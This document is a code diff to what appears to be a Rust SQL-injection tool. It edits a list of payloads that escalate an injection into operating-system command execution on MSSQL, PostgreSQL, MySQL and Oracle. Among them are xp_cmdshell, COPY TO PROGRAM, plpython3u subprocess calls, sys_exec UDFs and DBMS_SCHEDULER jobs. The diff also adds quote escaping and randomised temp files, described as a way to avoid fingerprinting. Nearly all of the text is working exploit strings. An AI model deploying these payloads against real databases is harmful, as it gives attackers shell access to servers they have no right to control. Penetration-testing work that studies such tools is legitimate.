@@ -26,12 +26,33 @@ pub struct OsExecPayload {
 pub struct OsCommandPayloads;
 
 impl OsCommandPayloads {
+    /// Generate a random temp file path to avoid TOCTOU and fingerprinting.
+    fn random_temp_file() -> String {
+        use rand::Rng;
+        let mut rng = rand::thread_rng();
+        let chars: String = (0..12)
+            .map(|_| rng.sample(rand::distributions::Alphanumeric) as char)
+            .collect();
+        format!("/tmp/sqx_out_{}", chars)
+    }
+
+    /// Escape SQL string literals by doubling single quotes.
+    /// ' → '' (standard SQL escaping)
+    fn escape_sql_string(s: &str) -> String {
+        s.replace('\'', "''")
+    }
+
     /// Generate payloads for executing `cmd` on the target OS.
+    /// The cmd parameter is SQL-escaped to prevent injection.
     pub fn all_payloads(cmd: &str) -> Vec<OsExecPayload> {
+        // Escape the command to prevent SQL injection
+        let cmd_escaped = Self::escape_sql_string(cmd);
+        // Generate random temp file for PostgreSQL payloads to avoid TOCTOU
+        let pg_temp_file = Self::random_temp_file();
         vec![
             // ── MSSQL ──────────────────────────────────────────────────────────────
             OsExecPayload {
-                payload: format!("'; EXEC xp_cmdshell '{}'-- ", cmd),
+                payload: format!("'; EXEC xp_cmdshell '{}'-- ", cmd_escaped),
                 description: "MSSQL xp_cmdshell direct",
                 dbms: "MSSQL",
                 required_privilege: "sysadmin",
@@ -42,7 +63,7 @@ impl OsCommandPayloads {
                     "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; \
                      EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; \
                      EXEC xp_cmdshell '{}'-- ",
-                    cmd
+                    cmd_escaped
                 ),
                 description: "MSSQL enable xp_cmdshell then exec",
                 dbms: "MSSQL",
@@ -54,7 +75,7 @@ impl OsCommandPayloads {
                     "'; CREATE TABLE #o(r NVARCHAR(MAX)); \
                      INSERT #o EXEC xp_cmdshell '{}'; \
                      SELECT CAST((SELECT TOP 1 r FROM #o) AS INT)-- ",
-                    cmd
+                    cmd_escaped
                 ),
                 description: "MSSQL xp_cmdshell via cast error exfil",
                 dbms: "MSSQL",
@@ -64,7 +85,7 @@ impl OsCommandPayloads {
             OsExecPayload {
                 payload: format!(
                     "'; DECLARE @r NVARCHAR(MAX); SET @r=N'{}'; EXEC master..xp_cmdshell @r-- ",
-                    cmd
+                    cmd_escaped
                 ),
                 description: "MSSQL xp_cmdshell via variable",
                 dbms: "MSSQL",
@@ -76,7 +97,7 @@ impl OsCommandPayloads {
                     "'; DECLARE @obj INT, @ret INT; \
                      EXEC sp_oacreate 'wscript.shell', @obj OUTPUT; \
                      EXEC sp_oamethod @obj, 'run', @ret OUTPUT, '{}'-- ",
-                    cmd
+                    cmd_escaped
                 ),
                 description: "MSSQL OLE Automation wscript.shell",
                 dbms: "MSSQL",
@@ -109,7 +130,7 @@ impl OsCommandPayloads {
             },
             // ── PostgreSQL ─────────────────────────────────────────────────────────
             OsExecPayload {
-                payload: format!("'; COPY (SELECT '') TO PROGRAM '{}'-- ", cmd),
+                payload: format!("'; COPY (SELECT '') TO PROGRAM '{}'-- ", cmd_escaped),
                 description: "PostgreSQL COPY TO PROGRAM",
                 dbms: "PostgreSQL",
                 required_privilege: "SUPERUSER",
@@ -117,19 +138,19 @@ impl OsCommandPayloads {
             },
             OsExecPayload {
                 payload: format!(
-                    "'; COPY (SELECT '') TO PROGRAM '{} > /tmp/_sqx_out'; \
+                    "'; COPY (SELECT '') TO PROGRAM '{} > {1}'; \
                      CREATE TEMP TABLE _o(l TEXT); \
-                     COPY _o FROM '/tmp/_sqx_out'; SELECT * FROM _o-- ",
-                    cmd
+                     COPY _o FROM '{1}'; SELECT * FROM _o-- ",
+                    cmd_escaped, pg_temp_file
                 ),
-                description: "PostgreSQL COPY TO PROGRAM + read back",
+                description: "PostgreSQL COPY TO PROGRAM + read back (random temp file)",
                 dbms: "PostgreSQL",
                 required_privilege: "SUPERUSER",
                 returns_output: true,
             },
             OsExecPayload {
-                payload: "' UNION SELECT (SELECT pg_read_file('/tmp/_sqx_out')),NULL-- ".to_string(),
-                description: "PostgreSQL read command output via pg_read_file",
+                payload: format!("' UNION SELECT (SELECT pg_read_file('{}')),NULL-- ", pg_temp_file),
+                description: "PostgreSQL read command output via pg_read_file (random temp file)",
                 dbms: "PostgreSQL",
                 required_privilege: "pg_read_server_files",
                 returns_output: true,
@@ -140,7 +161,7 @@ impl OsCommandPayloads {
                      CREATE OR REPLACE FUNCTION _sqx_exec() RETURNS TEXT AS \
                      $$ import subprocess; return subprocess.check_output('{}',shell=True,text=True) $$ \
                      LANGUAGE plpython3u; SELECT _sqx_exec()-- ",
-                    cmd
+                    cmd_escaped
                 ),
                 description: "PostgreSQL plpython3u exec",
                 dbms: "PostgreSQL",
@@ -151,7 +172,7 @@ impl OsCommandPayloads {
                 payload: format!(
                     "'; SELECT lo_export(lo_from_bytea(0,'{}'::bytea),'/tmp/_sqx.sh'); \
                      COPY (SELECT '') TO PROGRAM 'bash /tmp/_sqx.sh'-- ",
-                    cmd
+                    cmd_escaped
                 ),
                 description: "PostgreSQL lo_export + COPY TO PROGRAM",
                 dbms: "PostgreSQL",
@@ -184,14 +205,14 @@ impl OsCommandPayloads {
                 returns_output: false,
             },
             OsExecPayload {
-                payload: format!("'; SELECT sys_exec('{}')-- ", cmd),
+                payload: format!("'; SELECT sys_exec('{}')-- ", cmd_escaped),
                 description: "MySQL sys_exec UDF (requires raptor/lib_mysqludf_sys)",
                 dbms: "MySQL",
                 required_privilege: "FILE + plugin dir write",
                 returns_output: false,
             },
             OsExecPayload {
-                payload: format!("'; SELECT sys_eval('{}')-- ", cmd),
+                payload: format!("'; SELECT sys_eval('{}')-- ", cmd_escaped),
                 description: "MySQL sys_eval UDF (returns output)",
                 dbms: "MySQL",
                 required_privilege: "FILE + plugin dir write",
@@ -203,7 +224,7 @@ impl OsCommandPayloads {
                     "'; EXEC DBMS_SCHEDULER.CREATE_JOB(\
                      job_name=>'SQX_JOB',job_type=>'EXECUTABLE',\
                      job_action=>'{}',enabled=>TRUE,auto_drop=>TRUE)-- ",
-                    cmd
+                    cmd_escaped
                 ),
                 description: "Oracle DBMS_SCHEDULER CREATE_JOB",
                 dbms: "Oracle",
@@ -213,7 +234,7 @@ impl OsCommandPayloads {
             OsExecPayload {
                 payload: format!(
                     "'; EXEC DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper {} /tmp/out')-- ",
-                    cmd
+                    cmd_escaped
                 ),
                 description: "Oracle DBMS_JAVA.RUNJAVA Wrapper",
                 dbms: "Oracle",
@@ -225,7 +246,7 @@ impl OsCommandPayloads {
                     "'; DECLARE rc NUMBER; \
                      BEGIN rc:=DBMS_PIPE.PACK_MESSAGE('{} > /tmp/sqx_out'); \
                      rc:=DBMS_PIPE.SEND_MESSAGE('sqx'); END;-- ",
-                    cmd
+                    cmd_escaped
                 ),
                 description: "Oracle DBMS_PIPE command pipe",
                 dbms: "Oracle",
